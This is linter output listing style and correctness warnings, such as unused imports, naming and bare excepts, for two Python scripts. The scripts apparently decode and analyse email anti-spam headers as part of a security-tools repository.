 --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:6:8
  |
4 | import base64
5 | import glob
6 | import json
  |        ^^^^
7 | import os
8 | import re
  |
help: Remove unused import: `json`

F401 [*] `socket` imported but unused
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:9:8
   |
 7 | import os
 8 | import re
 9 | import socket
   |        ^^^^^^
10 | import string
11 | import sys
   |
help: Remove unused import: `socket`

F401 [*] `string` imported but unused
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:10:8
   |
 8 | import re
 9 | import socket
10 | import string
   |        ^^^^^^
11 | import sys
12 | import textwrap
   |
help: Remove unused import: `string`

F401 [*] `textwrap` imported but unused
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:12:8
   |
10 | import string
11 | import sys
12 | import textwrap
   |        ^^^^^^^^
13 | import time
   |
help: Remove unused import: `textwrap`

F401 [*] `time` imported but unused
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:13:8
   |
11 | import sys
12 | import textwrap
13 | import time
   |        ^^^^
14 |
15 | rules = {}
   |
help: Remove unused import: `time`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:37:9
   |
36 |           base = os.path.basename(file)
37 | /         if len(FILES_PREFIX) > 0:
38 | |             if not base.lower().startswith(FILES_PREFIX.lower()):
   | |_________________________________________________________________^
39 |                   continue
   |
help: Combine `if` statements using `and`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:50:16
   |
48 |             rule = m.group(1)
49 |
50 |             if file not in files_and_their_rules.keys():
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
51 |                 files_and_their_rules[file] = set()
   |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:55:16
   |
53 |             files_and_their_rules[file].add(rule)
54 |
55 |             if rule in rules.keys():
   |                ^^^^^^^^^^^^^^^^^^^^
56 |                 if file not in rules[rule]["files"]:
57 |                     rules[rule]["count"] += 1
   |
help: Remove `.keys()`

C405 Unnecessary list literal (rewrite as a set literal)
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:62:40
   |
60 |                   rules[rule] = {}
61 |                   rules[rule]["count"] = 1
62 |                   rules[rule]["files"] = set(
   |  ________________________________________^
63 | |                     [
64 | |                         file,
65 | |                     ]
66 | |                 )
   | |_________________^
   |
help: Rewrite as a set literal

F841 Local variable `paths` is assigned to but never used
  --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:71:5
   |
69 | def main(argv):
70 |
71 |     paths = []
   |     ^^^^^
72 |     for i in range(len(argv)):
73 |         arg = argv[i]
   |
help: Remove assignment to unused variable `paths`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:105:13
    |
104 |               n = max(len(v.difference(v1)), len(v1.difference(v)))
105 | /             if n <= 3 and n > 0:
106 | |                 if k not in checked and k1 not in checked:
    | |__________________________________________________________^
107 |                       output += f" {n: <2} | {k[-50:]: <50} | {k1[-50:]: <50} |\n"
108 |                       checked.add(k)
    |
help: Combine `if` statements using `and`

C416 Unnecessary dict comprehension (rewrite using `dict()`)
   --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:119:9
    |
118 |       num = 0
119 |       s = {
    |  _________^
120 | |         k: v
121 | |         for k, v in sorted(files_and_their_rules.items(), key=lambda item: len(item[1]))
122 | |     }
    | |_____^
123 |
124 |       for k, v in s.items():
    |
help: Rewrite using `dict()`

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:125:9
    |
124 |     for k, v in s.items():
125 |         num += 1
    |         ^^^^^^^^
126 |         print(f"{num: <3}. Rules: {len(v): <2}, File: {k}")
    |

F401 [*] `time` imported but unused
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:132:8
    |
130 | import sys
131 | import textwrap
132 | import time
    |        ^^^^
133 | from datetime import *
134 | from email import header as emailheader
    |
help: Remove unused import: `time`

F403 `from datetime import *` used; unable to detect undefined names
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:133:1
    |
131 | import textwrap
132 | import time
133 | from datetime import *
    | ^^^^^^^^^^^^^^^^^^^^^^
134 | from email import header as emailheader
135 | from html import escape
    |

F403 `from dateutil.tz import *` used; unable to detect undefined names
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:137:1
    |
135 | from html import escape
136 |
137 | from dateutil.tz import *
    | ^^^^^^^^^^^^^^^^^^^^^^^^^
138 |
139 | try:
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:144:41
    |
142 |     print(
143 |         """
144 | [!] You need to install python-dateutil: 
    |                                         ^
145 |         # pip3 install python-dateutil
146 | """
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:155:34
    |
153 |     print(
154 |         """
155 | [!] You need to install colorama: 
    |                                  ^
156 |         # pip3 install colorama
157 | """
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:167:35
    |
165 |     print(
166 |         """
167 | [!] You need to install packaging: 
    |                                   ^
168 |         # pip3 install packaging
169 | """
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:178:34
    |
176 |     print(
177 |         """
178 | [!] You need to install requests: 
    |                                  ^
179 |         # pip3 install requests
180 | """
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:189:36
    |
187 |     print(
188 |         """
189 | [!] You need to install tldextract: 
    |                                    ^
190 |         # pip3 install tldextract
191 | """
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:201:35
    |
199 |     print(
200 |         """
201 | [!] You need to install dnspython: 
    |                                   ^
202 |         # pip3 install dnspython
    |
help: Remove trailing whitespace

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:258:20
    |
256 |     def __init__(self, opts=None):
257 |         self.options.update(Logger.options)
258 |         if opts != None and len(opts) > 0:
    |                    ^^^^
259 |             self.options.update(opts)
    |
help: Replace with `cond is not None`

N803 Argument name `colorizingFunc` should be lowercase
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:267:26
    |
266 |     @staticmethod
267 |     def replaceColors(s, colorizingFunc):
    |                          ^^^^^^^^^^^^^^
268 |         pos = 0
    |

F405 `out` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:310:16
    |
308 |         return Logger.replaceColors(s, lambda c, txt: txt)
309 |
310 |         return out
    |                ^^^
311 |
312 |     def ansiColors(s):
    |

N805 First argument of a method should be named `self`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:312:20
    |
310 |         return out
311 |
312 |     def ansiColors(s):
    |                    ^
313 |         return Logger.replaceColors(s, lambda c, txt: f"\x1b[{c}m{txt}\x1b[0m")
    |
help: Rename `s` to `self`

N806 Variable `htmlCol` in function should be lowercase
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:322:21
    |
320 |             for k, v in Logger.colors_map.items():
321 |                 if v == c:
322 |                     htmlCol = Logger.html_colors_map[k]
    |                     ^^^^^^^
323 |                     return f'<font class="text-{k}">{text}</font>'
    |

F841 Local variable `htmlCol` is assigned to but never used
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:322:21
    |
320 |             for k, v in Logger.colors_map.items():
321 |                 if v == c:
322 |                     htmlCol = Logger.html_colors_map[k]
    |                     ^^^^^^^
323 |                     return f'<font class="text-{k}">{text}</font>'
    |
help: Remove assignment to unused variable `htmlCol`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:339:19
    |
337 |     @staticmethod
338 |     def out(txt, fd, mode="info ", **kwargs):
339 |         if txt == None or fd == "none":
    |                   ^^^^
340 |             return
341 |         elif fd == None:
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:341:20
    |
339 |         if txt == None or fd == "none":
340 |             return
341 |         elif fd == None:
    |                    ^^^^
342 |             raise Exception("[ERROR] Logging descriptor has not been specified!")
    |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:347:12
    |
345 |         args.update(kwargs)
346 |
347 |         if type(txt) != str:
    |            ^^^^^^^^^^^^^^^^
348 |             txt = str(txt)
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:356:16
    |
354 |         elif args["color"]:
355 |             col = args["color"]
356 |             if type(col) == str and col in Logger.colors_map.keys():
    |                ^^^^^^^^^^^^^^^^
357 |                 col = Logger.colors_map[col]
358 |         else:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:356:37
    |
354 |         elif args["color"]:
355 |             col = args["color"]
356 |             if type(col) == str and col in Logger.colors_map.keys():
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
357 |                 col = Logger.colors_map[col]
358 |         else:
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:363:20
    |
361 |         prefix = ""
362 |         if mode:
363 |             mode = "[%s] " % mode
    |                    ^^^^^^^^^^^^^^
364 |
365 |         if not args["noprefix"]:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:370:50
    |
368 |             else:
369 |                 prefix = Logger.with_color(
370 |                     Logger.colors_dict["other"], "%s" % (mode.upper())
    |                                                  ^^^^^^^^^^^^^^^^^^^^^
371 |                 )
    |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:374:9
    |
373 |           nl = ""
374 | /         if "newline" in args:
375 | |             if args["newline"]:
    | |_______________________________^
376 |                   nl = "\n"
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:383:12
    |
381 |         to_write = ""
382 |
383 |         if type(fd) == str:
    |            ^^^^^^^^^^^^^^^
384 |             prefix2 = ""
385 |             if mode:
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:386:27
    |
384 |             prefix2 = ""
385 |             if mode:
386 |                 prefix2 = "%s" % (mode.upper())
    |                           ^^^^^^^^^^^^^^^^^^^^^
387 |             prefix2 + txt + nl
    |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:397:12
    |
395 |         to_write = Logger.ansiColors(to_write)
396 |
397 |         if type(fd) == str:
    |            ^^^^^^^^^^^^^^^
398 |             with open(fd, "a") as f:
399 |                 f.write(to_write)
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:411:17
    |
409 |             forced
410 |             or (self.options["verbose"] or self.options["debug"])
411 |             or (type(self.options["log"]) == str and self.options["log"] != "none")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
412 |         ):
413 |             Logger.out(txt, self.options["log"], "info", **kwargs)
    |

UP004 [*] Class `Verstring` inherits from `object`
   --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:441:17
    |
441 | class Verstring(object):
    |                 ^^^^^^
442 |     def __init__(self, name, date, *versions):
443 |         self.name = name
    |
help: Remove `object` inheritance

F601 Dictionary key literal `"460985005"` repeated
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:1163:9
     |
1161 |         "19625305002": "(GUESSING) Something to do with the HTML code and used tags/structures",
1162 |         "43540500002": "(GUESSING) Something to do with the HTML code and used tags/structures",
1163 |         "460985005": "(GUESSING) Something to do with either more-complex HTML code or with the <a> tag and its URL.",
     |         ^^^^^^^^^^^
1164 |         # Triggered on an empty text message, subject "test" - that was marked with "Domain Impersonation", however
1165 |         # ForeFront Anti-Spam headers did not support that Domain Impersonation. Weird.
     |
help: Remove repeated key literal `"460985005"`

N803 Argument name `testsToRun` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:3791:9
     |
3789 |         resolve=False,
3790 |         decode_all=False,
3791 |         testsToRun=[],
     |         ^^^^^^^^^^^^^
3792 |         includeUnusual=False,
3793 |     ):
     |

B006 Do not use mutable data structures for argument defaults
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:3791:20
     |
3789 |         resolve=False,
3790 |         decode_all=False,
3791 |         testsToRun=[],
     |                    ^^
3792 |         includeUnusual=False,
3793 |     ):
     |
help: Replace with `None`; initialize within function

N803 Argument name `includeUnusual` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:3792:9
     |
3790 |         decode_all=False,
3791 |         testsToRun=[],
3792 |         includeUnusual=False,
     |         ^^^^^^^^^^^^^^^^^^^^
3793 |     ):
3794 |         self.text = ""
     |

N806 Variable `testsDecodeAll` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:3976:9
     |
3974 |         )
3975 |
3976 |         testsDecodeAll = (
     |         ^^^^^^^^^^^^^^
3977 |             (
3978 |                 "80",
     |

N806 Variable `testsReturningArray` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:3985:9
     |
3983 |         )
3984 |
3985 |         testsReturningArray = (
     |         ^^^^^^^^^^^^^^^^^^^
3986 |             ("82", "Header Containing Client IP", self.testAnyOtherIP),
3987 |             ("86", "Suspicious Words in Headers", self.testSuspiciousWordsInHeaders),
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4004:12
     |
4002 |         enc = False
4003 |
4004 |         if type(value) == str:
     |            ^^^^^^^^^^^^^^^^^^
4005 |             enc = True
4006 |             value = value.encode()
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4010:9
     |
4008 |         try:
4009 |             out = base64.b64decode(value)
4010 |         except:
     |         ^^^^^^
4011 |             try:
4012 |                 out = base64.b64decode(value + b"=" * (-len(value) % 4))
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4013:13
     |
4011 |             try:
4012 |                 out = base64.b64decode(value + b"=" * (-len(value) % 4))
4013 |             except:
     |             ^^^^^^
4014 |                 out = value
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4032:12
     |
4030 |             return ""
4031 |
4032 |         if addr in SMTPHeadersAnalysis.resolved.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4033 |             logger.dbg(f'Returning cached gethostbyaddr entry for: "{addr}"')
4034 |             return SMTPHeadersAnalysis.resolved[addr]
     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4043:9
     |
4041 |                 SMTPHeadersAnalysis.resolved[addr] = res[0]
4042 |                 return res[0]
4043 |         except:
     |         ^^^^^^
4044 |             pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4054:12
     |
4052 |             return ""
4053 |
4054 |         if name in SMTPHeadersAnalysis.resolved.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4055 |             logger.dbg(f'Returning cached gethostbyname entry for: "{name}"')
4056 |             return SMTPHeadersAnalysis.resolved[name]
     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4065:9
     |
4063 |                 SMTPHeadersAnalysis.resolved[name] = res
4064 |                 return res
4065 |         except:
     |         ^^^^^^
4066 |             pass
     |

F841 Local variable `prevver` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4096:17
     |
4094 |             nextver = packaging.version.parse("99999.0")
4095 |             if i > 0:
4096 |                 prevver = packaging.version.parse(sortedversions[i - 1].version)
     |                 ^^^^^^^
4097 |             thisver = packaging.version.parse(sortedversions[i].version)
4098 |             if i + 1 < len(sortedversions):
     |
help: Remove assignment to unused variable `prevver`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4116:24
     |
4114 |                 if m1:
4115 |                     v1d = emailheader.decode_header(value)[0][0]
4116 |                     if type(v1d) == bytes:
     |                        ^^^^^^^^^^^^^^^^^^
4117 |                         v1d = v1d.decode(errors="ignore")
4118 |                     value = v1d
     |

B034 `re.sub` should pass `count` and `flags` as keyword arguments to avoid confusion due to unintuitive argument positions
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4129:27
     |
4127 |         for sim in similar_headers:
4128 |             if sim[0].lower() in _header.lower():
4129 |                 _header = re.sub(sim[0], sim[1], _header, re.I)
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4130 |
4131 |                 for num, header, value in self.headers:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4136:32
     |
4134 |                         if m1:
4135 |                             v1d = emailheader.decode_header(value)[0][0]
4136 |                             if type(v1d) == bytes:
     |                                ^^^^^^^^^^^^^^^^^^
4137 |                                 v1d = v1d.decode(errors="ignore")
4138 |                             value = v1d
     |

N806 Variable `errorOnce` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4145:9
     |
4143 |     def collect(self, text):
4144 |         num = 0
4145 |         errorOnce = False
     |         ^^^^^^^^^
4146 |         lines = text.split("\n")
4147 |         boundary = ""
     |

N806 Variable `inBoundary` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4148:9
     |
4146 |         lines = text.split("\n")
4147 |         boundary = ""
4148 |         inBoundary = False
     |         ^^^^^^^^^^
4149 |         headers = []
     |

N806 Variable `inBoundary` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4156:17
     |
4155 |             if len(boundary) > 0 and f"--{boundary}" == line.strip():
4156 |                 inBoundary = True
     |                 ^^^^^^^^^^
4157 |                 i += 1
4158 |                 continue
     |

N806 Variable `inBoundary` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4161:17
     |
4160 |             elif inBoundary and f"--{boundary}--" == line.strip():
4161 |                 inBoundary = False
     |                 ^^^^^^^^^^
4162 |                 i += 1
4163 |                 continue
     |

N806 Variable `considerNextLineIndented` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4192:25
     |
4190 |                         val = ""
4191 |
4192 |                         considerNextLineIndented = (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^
4193 |                             match.group(1)
4194 |                             in SMTPHeadersAnalysis.Headers_Known_For_Breaking_Line
     |

N806 Variable `errorOnce` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4216:33
     |
4214 | ΓÇª                         )
4215 | ΓÇª                     ):
4216 | ΓÇª                         errorOnce = True
     |                           ^^^^^^^^^
4217 | ΓÇª                         self.logger.err(
4218 | ΓÇª                             """
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4223:45
     |
4221 | -----------------------------------------
4222 |
4223 | Your SMTP headers are not properly indented! 
     |                                             ^
4224 | Results will be unsound. Make sure you have pasted your headers with correct spaces/tabs indentation.
     |
help: Remove trailing whitespace

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4230:33
     |
4229 |                             while i + j < len(lines):
4230 |                                 l = lines[i + j]
     |                                 ^
4231 |
4232 |                                 if (
     |

N806 Variable `considerNextLineIndented` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4239:37
     |
4237 | ΓÇª                         val += l + "\n"
4238 | ΓÇª                         j += 1
4239 | ΓÇª                         considerNextLineIndented = False
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^
4240 | ΓÇª                     else:
4241 | ΓÇª                         break
     |

N806 Variable `testsDecodeAll` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4268:17
     |
4266 |         self.headers = self.collect(text)
4267 |
4268 |         (tests, testsDecodeAll, testsReturningArray) = self.getAllTests()
     |                 ^^^^^^^^^^^^^^
4269 |
4270 |         testsConducted = 0
     |

N806 Variable `testsReturningArray` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4268:33
     |
4266 |         self.headers = self.collect(text)
4267 |
4268 |         (tests, testsDecodeAll, testsReturningArray) = self.getAllTests()
     |                                 ^^^^^^^^^^^^^^^^^^^
4269 |
4270 |         testsConducted = 0
     |

N806 Variable `testsConducted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4270:9
     |
4268 |         (tests, testsDecodeAll, testsReturningArray) = self.getAllTests()
4269 |
4270 |         testsConducted = 0
     |         ^^^^^^^^^^^^^^
4271 |
4272 |         for testId, testName, testFunc in tests:
     |

N806 Variable `testId` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4272:13
     |
4270 |         testsConducted = 0
4271 |
4272 |         for testId, testName, testFunc in tests:
     |             ^^^^^^
4273 |             try:
4274 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4272:21
     |
4270 |         testsConducted = 0
4271 |
4272 |         for testId, testName, testFunc in tests:
     |                     ^^^^^^^^
4273 |             try:
4274 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testFunc` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4272:31
     |
4270 |         testsConducted = 0
4271 |
4272 |         for testId, testName, testFunc in tests:
     |                               ^^^^^^^^
4273 |             try:
4274 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testsConducted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4278:17
     |
4276 |                     continue
4277 |
4278 |                 testsConducted += 1
     |                 ^^^^^^^^^^^^^^
4279 |                 self.logger.dbg(f'Running test {testId}: "{testName}"...')
4280 |                 self.results[testName] = testFunc()
     |

N806 Variable `idsOfDecodeAll` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4296:9
     |
4294 |                     raise
4295 |
4296 |         idsOfDecodeAll = [int(x[0]) for x in testsDecodeAll]
     |         ^^^^^^^^^^^^^^
4297 |
4298 |         # for a in self.testsToRun:
     |

F841 Local variable `idsOfDecodeAll` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4296:9
     |
4294 |                     raise
4295 |
4296 |         idsOfDecodeAll = [int(x[0]) for x in testsDecodeAll]
     |         ^^^^^^^^^^^^^^
4297 |
4298 |         # for a in self.testsToRun:
     |
help: Remove assignment to unused variable `idsOfDecodeAll`

N806 Variable `testId` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4304:17
     |
4303 |         if self.decode_all:
4304 |             for testId, testName, testFunc in testsDecodeAll:
     |                 ^^^^^^
4305 |                 try:
4306 |                     if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4304:25
     |
4303 |         if self.decode_all:
4304 |             for testId, testName, testFunc in testsDecodeAll:
     |                         ^^^^^^^^
4305 |                 try:
4306 |                     if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testFunc` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4304:35
     |
4303 |         if self.decode_all:
4304 |             for testId, testName, testFunc in testsDecodeAll:
     |                                   ^^^^^^^^
4305 |                 try:
4306 |                     if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testsConducted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4310:21
     |
4308 |                         continue
4309 |
4310 |                     testsConducted += 1
     |                     ^^^^^^^^^^^^^^
4311 |                     self.logger.dbg(f'Running test {testId}: "{testName}"...')
4312 |                     self.results[testName] = testFunc()
     |

N806 Variable `testId` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4328:13
     |
4326 |                         raise
4327 |
4328 |         for testId, testName, testFunc in testsReturningArray:
     |             ^^^^^^
4329 |             try:
4330 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4328:21
     |
4326 |                         raise
4327 |
4328 |         for testId, testName, testFunc in testsReturningArray:
     |                     ^^^^^^^^
4329 |             try:
4330 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testFunc` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4328:31
     |
4326 |                         raise
4327 |
4328 |         for testId, testName, testFunc in testsReturningArray:
     |                               ^^^^^^^^
4329 |             try:
4330 |                 if len(self.testsToRun) > 0 and int(testId) not in self.testsToRun:
     |

N806 Variable `testsConducted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4334:17
     |
4332 |                     continue
4333 |
4334 |                 testsConducted += 1
     |                 ^^^^^^^^^^^^^^
4335 |                 self.logger.dbg(f'Running test {testId}: "{testName}"...')
4336 |                 outs = testFunc()
     |

SIM113 Use `enumerate()` for index variable `num` in `for` loop
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4340:21
     |
4338 |                 num = 0
4339 |                 for o in outs:
4340 |                     num += 1
     |                     ^^^^^^^^
4341 |                     self.results[testName + " " + str(num)] = o
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4357:13
     |
4355 |                     raise
4356 |
4357 |         for k in self.results.keys():
     |             ^^^^^^^^^^^^^^^^^^^^^^^^
4358 |             if not self.results[k] or len(self.results[k]) == 0:
4359 |                 continue
     |
help: Remove `.keys()`

B008 Do not perform function call `ord` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4403:34
     |
4402 |     @staticmethod
4403 |     def unrotSpamcause(pair, key=ord("x")):
     |                                  ^^^^^^^^
4404 |         offset = 0
4405 |         for c in "cdefgh":
     |

F841 Local variable `s` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4413:9
     |
4411 |     @staticmethod
4412 |     def hexdump(data, addr=0, num=0):
4413 |         s = ""
     |         ^
4414 |         n = 0
4415 |         lines = []
     |
help: Remove assignment to unused variable `s`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4438:25
     |
4436 |                     break
4437 |                 c = data[j] if not (data[j] < 0x20 or data[j] > 0x7E) else "."
4438 |                 line += "%c" % c
     |                         ^^^^
4439 |
4440 |             lines.append(line)
     |
help: Replace with format specifiers

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4713:18
     |
4711 |             return []
4712 |
4713 |         result = f"- Mail contents analysis shown that this e-mail passed through the following third-party Mail providers:\n\n"
